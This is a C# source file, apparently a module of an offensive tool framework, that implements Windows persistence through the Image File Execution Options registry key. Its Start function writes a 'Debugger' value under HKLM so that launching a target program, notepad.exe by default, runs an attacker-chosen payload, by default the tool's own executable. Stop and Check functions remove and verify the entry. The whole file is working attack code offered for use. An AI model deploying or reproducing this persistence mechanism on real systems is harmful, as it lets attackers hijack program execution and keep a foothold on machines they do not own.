using System;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultTarget = "notepad.exe";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 ifeo Start {defaultTarget} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string targetExe = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "notepad.exe";

            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1]))
                ? args[1]
                : GetDefaultPayloadPath();

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return "[-] Access denied opening IFEO registry key. Run as administrator.";

                using var existing = baseKey.OpenSubKey(targetExe);
                if (existing != null && existing.GetValue("Debugger") != null)
                    return $"[*] IFEO debugger already configured for '{targetExe}'.";

                using var subKey = baseKey.CreateSubKey(targetExe, writable: true);
                if (subKey == null)
                    return $"[-] Failed to create IFEO subkey for '{targetExe}'.";

                subKey.SetValue("Debugger", payloadPath, RegistryValueKind.String);

                return $"[+] Successfully Installed IFEO debugger for '{targetExe}' -> Payload: '{payloadPath}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. IFEO configuration requires administrative privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string targetExe = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "notepad.exe";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return "[-] Access denied opening IFEO registry key. Run as administrator.";

                using var subKey = baseKey.OpenSubKey(targetExe, writable: true);
                if (subKey == null)
                    return $"[*] No IFEO entry found for '{targetExe}'.";

                if (subKey.GetValue("Debugger") == null)
                    return $"[*] No Debugger value set under IFEO for '{targetExe}'.";

                subKey.DeleteValue("Debugger");

                if (subKey.ValueCount == 0 && subKey.SubKeyCount == 0)
                {
                    subKey.Close();
                    baseKey.DeleteSubKey(targetExe);
                }

                return $"[+] Successfully removed IFEO debugger entry for '{targetExe}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. IFEO modification requires administrative privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string targetExe = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
                ? args[0]
                : "notepad.exe";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return "[-] Access denied opening IFEO registry key.";

                using var subKey = baseKey.OpenSubKey(targetExe);
                if (subKey == null)
                    return $"[*] No IFEO entry found for '{targetExe}'.";

                string debugger = subKey.GetValue("Debugger")?.ToString();
                if (debugger == null)
                    return $"[*] No Debugger value set for '{targetExe}'.";

                return $"[+] Verified IFEO debugger for '{targetExe}' -> '{debugger}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied inspecting IFEO registry parameters.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }
    }
}